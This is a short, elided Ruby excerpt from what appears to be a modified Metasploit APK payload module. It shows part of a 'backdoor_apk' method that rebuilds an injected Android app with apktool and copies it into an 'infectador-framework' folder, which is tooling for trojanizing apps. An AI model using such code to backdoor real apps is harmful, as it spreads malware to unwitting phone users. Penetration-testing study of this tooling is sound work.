...
class Msf::Payload::Apk
  ...
  def backdoor_apk(apkfile, raw_payload)
    ...
    print_status "infectador-framework && metasploit-framework"
    run_cmd("apktool b --aapt ~/infectador-framework/aapt -o #{injected_apk} #{tempdir}/original")
    unless File.readable?(injected_apk)
      raise RuntimeError, "Unable to rebuild apk with apktool"
    end

    run_cmd("cp #{tempdir}/output.apk ~/infectador-framework/apk")
